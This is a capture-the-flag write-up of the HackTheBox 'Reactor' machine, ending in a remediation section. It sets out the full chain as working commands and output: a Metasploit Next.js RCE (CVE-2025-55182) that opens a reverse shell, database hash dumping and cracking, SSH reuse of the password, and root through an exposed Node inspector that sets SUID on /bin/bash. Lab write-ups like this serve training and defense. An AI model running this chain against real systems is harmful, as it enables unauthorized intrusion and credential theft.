# HackTheBox — Reactor (Easy, Linux)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-25 05:34 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.36s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 <REDACTED_FINGERPRINT> (ECDSA)
|_  256 <REDACTED_FINGERPRINT> (ED25519)
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000,
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Mon, 25 May 2026 05:39:38 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 25 May 2026 05:39:43 GMT
|     Connection: close
|   Help, NCP, RPCCheck:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Mon, 25 May 2026 05:39:44 GMT
|_    Connection: close
1 service unrecognized despite returning data.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.08 seconds
```

Two open ports: SSH (22) and an unidentified service on 3000. The HTTP fingerprint reveals the `X-Powered-By: Next.js` header along with React Server Component (`RSC`) routing headers — this is a **Next.js** web application.

---

## 2. Service Identification

Fingerprinting the Next.js application identifies it as **Next.js v15.0.3**, which is vulnerable to:

> **CVE-2025-55182 ("React2Shell")** — An unauthenticated remote code execution vulnerability in Next.js applications.

---

## 3. Exploitation — Unauthenticated RCE (CVE-2025-55182)

A Metasploit module is available for this vulnerability: `exploit/multi/http/react2shell_unauth_rce_cve_2025_55182`.

### 3.1 Verifying Vulnerability

```
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > check
[+] 10.129.xx.xx:3000 - The target appears to be vulnerable.
```

### 3.2 Running the Exploit

```
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > check
[+] 10.129.xx.xx:3000 - The target appears to be vulnerable.
msf exploit(multi/http/react2shell_unauth_rce_cve_2025_55182) > run
[*] Started reverse TCP handler on 10.10.xx.xx:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Command shell session 1 opened (10.10.xx.xx:4444 -> 10.129.xx.xx:49020) at 2026-05-25 05:42:29 +0000
```

### 3.3 Confirming Access

```
id
uid=999(node) gid=988(node) groups=988(node)
```

We have a command shell as the low-privileged `node` service account.

---

## 4. Foothold — Database Enumeration & Credential Cracking

### 4.1 Exploring the Application Directory

```
ls
app
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

A SQLite database file, `reactor.db`, sits alongside the Next.js application — a strong lead for stored credentials.

### 4.2 Upgrading to a Full TTY

```bash
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```
```
node@reactor:/opt/reactor-app$
```

### 4.3 Querying the SQLite Database

```bash
node@reactor:/opt/reactor-app$ which sqlite3
/usr/bin/sqlite3
```

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
```

```
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
sensor_logs  users
sqlite> select * from users;
1|admin|<REDACTED_MD5_HASH>|administrator|admin@reactor.htb
2|engineer|<REDACTED_MD5_HASH>|operator|engineer@reactor.htb
sqlite>
.exit
```

Two user records are recovered, each with an MD5-format password hash: `admin` (administrator role) and `engineer` (operator role).

### 4.4 Cracking the Hash

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
```

```
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
<REDACTED_PASSWORD>      (?)
1g 0:00:00:00 DONE (2026-05-25 05:55) 1.369g/s 19648Kp/s 19648Kc/s 20110KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

One hash cracks successfully against `rockyou.txt`.

### 4.5 Confirming Local Users

```
node@reactor:/home$ ls
engineer  node
```

The `engineer` system account exists, matching the database record — testing the cracked credential against SSH.

---

## 5. Lateral Movement — SSH as engineer

```bash
ssh engineer@10.129.xx.xx
```

```
The authenticity of host '10.129.xx.xx (10.129.xx.xx)' can't be established.
ED25519 key fingerprint is: SHA256:<REDACTED>
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:579: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.xx.xx' (ED25519) to the list of known hosts.
engineer@10.129.xx.xx's password:
 ____  _____    _    ____ _____ ___  ____
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ <
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7

    AUTHORIZED PERSONNEL ONLY
Last login: Mon May 25 06:02:51 2026 from 10.10.xx.xx
engineer@reactor:~$
```

The cracked password is valid for SSH login as `engineer`.

### 5.1 User Flag

```bash
engineer@reactor:~$ cat user.txt
```
```
<REDACTED_USER_FLAG>
```

### 5.2 Checking Privileges

```bash
engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

The `engineer` user is a member of the **`lxd`** group — normally a privilege-escalation vector via LXD/LXC container breakout — but attempting to use it directly fails:

```bash
engineer@reactor:~$ lxc image list
Installing LXD snap, please be patient.
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionResetError: [Errno 104] Connection reset by peer
```

LXD is not properly available/functional here, so we look for another path.

---

## 6. Privilege Escalation — Node.js Inspector Debug Port Abuse

### 6.1 Identifying a Privileged Node Process

Process listing reveals a Node.js process running as **root**, with its debug inspector port exposed on localhost:

```
2026/05/25 06:20:12 CMD: UID=0     PID=1629   | /usr/libexec/upowerd
2026/05/25 06:20:12 CMD: UID=0     PID=1418   | /sbin/agetty -o -p -- \u --noclear - linux
2026/05/25 06:20:12 CMD: UID=0     PID=1410   | /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
2026/05/25 06:20:12 CMD: UID=999   PID=1408   | next-server (v15.0.3)
2026/05/25 06:20:12 CMD: UID=0     PID=1407   | /usr/sbin/cron -f -P
```

`/opt/uptime-monitor/worker.js` is running as root (`UID=0`) with the **Node.js Inspector protocol** enabled on `127.0.0.1:9229`. The Node Inspector is a debugging interface that, if reachable, allows **arbitrary JavaScript execution within that process's context** — a well-known and severe local privilege escalation vector when exposed on a process running as root.

### 6.2 Confirming Inspector Access

```bash
engineer@reactor:/tmp$ curl http://127.0.0.1:9229/json
```

```json
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/cbbbc6ed-39d5-4709-93d2-cf00588b442d",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/cbbbc6ed-39d5-4709-93d2-cf00588b442d",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "cbbbc6ed-39d5-4709-93d2-cf00588b442d",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/cbbbc6ed-39d5-4709-93d2-cf00588b442d"
} ]
```

The Inspector is reachable and exposes a WebSocket debugger URL we can connect to.

### 6.3 Connecting to the Inspector

```bash
engineer@reactor:/tmp$ node inspect 127.0.0.1:9229
```

```
connecting to 127.0.0.1:9229 ... ok
debug>
```

### 6.4 Achieving Code Execution as Root

Using the inspector's `exec` capability to run arbitrary JS within the target process — which in turn can spawn shell commands via Node's `child_process` module:

```javascript
debug> exec("process.mainModule.require('child_process').execSync('whoami').toString()")
```
```
'root\n'
```

Confirmed: code executes as root. We escalate this into a persistent privilege by setting the SUID bit on `/bin/bash`:

```javascript
debug> exec("process.mainModule.require('child_process').execSync('chmod +s /bin/bash')")
```
```
Uint8Array(0)
```

### 6.5 Confirming and Using the SUID Bash

```bash
engineer@reactor:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

```bash
engineer@reactor:/tmp$ /bin/bash -p
```

```
bash-5.2# id
uid=1000(engineer) gid=1000(engineer) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd),1000(engineer)
```

Effective UID 0 confirmed — full root access achieved.

### 6.6 Root Flag

```bash
bash-5.2# cat root.txt
```
```
<REDACTED_ROOT_FLAG>
```

---

## 7. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | Identified SSH and a Next.js application on port 3000 |
| 2 | Version fingerprinting | Next.js v15.0.3, vulnerable to CVE-2025-55182 (React2Shell) |
| 3 | Unauthenticated RCE via Metasploit module | Command shell as `node` |
| 4 | Located and queried `reactor.db` (SQLite) | Recovered `admin`/`engineer` MD5 password hashes |
| 5 | Cracked hash with John the Ripper + rockyou.txt | Recovered plaintext password for `engineer` |
| 6 | SSH login as `engineer` | Stable shell access, user flag captured |
| 7 | Process enumeration | Found root-owned Node.js process with debug Inspector exposed on `127.0.0.1:9229` |
| 8 | Connected to Node Inspector, executed JS via `child_process` | Arbitrary command execution as root |
| 9 | Set SUID bit on `/bin/bash` | Persistent root shell, root flag captured |

---

## 8. Tools Used

- `nmap` — port/service scanning
- `Metasploit Framework` (`exploit/multi/http/react2shell_unauth_rce_cve_2025_55182`) — unauthenticated RCE exploitation
- `sqlite3` — local database enumeration
- `John the Ripper` — offline hash cracking
- `ssh` — lateral movement
- `node inspect` (Node.js built-in debugger client) — abusing the exposed V8 Inspector protocol for privilege escalation

---

## 9. Key Takeaways / Remediation

1. **Outdated Next.js Version:** Running Next.js v15.0.3 exposed the application to an unauthenticated, critical RCE (CVE-2025-55182). Framework dependencies should be patched promptly and monitored for CVE disclosures.
2. **Weak/Crackable Password Hashing:** Storing user passwords as unsalted MD5 hashes in the application database made offline cracking trivial. Passwords should be hashed with a modern, slow, salted algorithm (bcrypt, scrypt, or Argon2).
3. **Database File Readable by the Application's Service Account:** The `node` service account (which the RCE landed in) had direct filesystem access to `reactor.db`, allowing credential harvesting immediately after initial compromise. Sensitive data stores should be access-controlled separately from the web application runtime where possible.
4. **Node.js Inspector Exposed on a Privileged Process:** Running `node --inspect` on a process owned by root, even bound to localhost, creates a critical local privilege escalation path for any user who can reach that port — the V8 Inspector protocol allows arbitrary code execution by design. Debug/inspector flags should never be enabled on production or privileged processes; if debugging is required, it should be done in isolated, non-privileged environments only.
5. **Group Membership Without Effective Tooling (lxd):** The `engineer` account was a member of the `lxd` group, a recognized privilege escalation vector, though it was not exploitable here due to a non-functional LXD installation. Group memberships granting elevated capabilities should be reviewed and removed if not operationally necessary.

---
